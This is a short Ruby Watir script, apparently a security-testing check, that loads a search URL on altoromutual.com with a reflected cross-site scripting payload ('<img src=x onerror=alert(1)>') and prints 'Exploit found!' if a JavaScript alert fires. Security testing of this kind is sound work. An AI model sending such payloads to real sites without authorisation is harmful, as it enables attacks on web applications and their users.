#!/usr/bin/env ruby

require 'watir'

browser = Watir::Browser.new :chrome
wait = Selenium::WebDriver::Wait.new(:timeout => 15)

begin
  browser.goto("http://www.altoromutual.com/search.aspx?txtSearch=<img src=x onerror=alert(1)>")
rescue Selenium::WebDriver::Error::UnhandledAlertError
  browser.refresh
  wait.until {browser.alert.exists?}
end

if browser.alert.exists?
  browser.alert.ok
  puts "[+] Exploit found!"
  browser.close
end
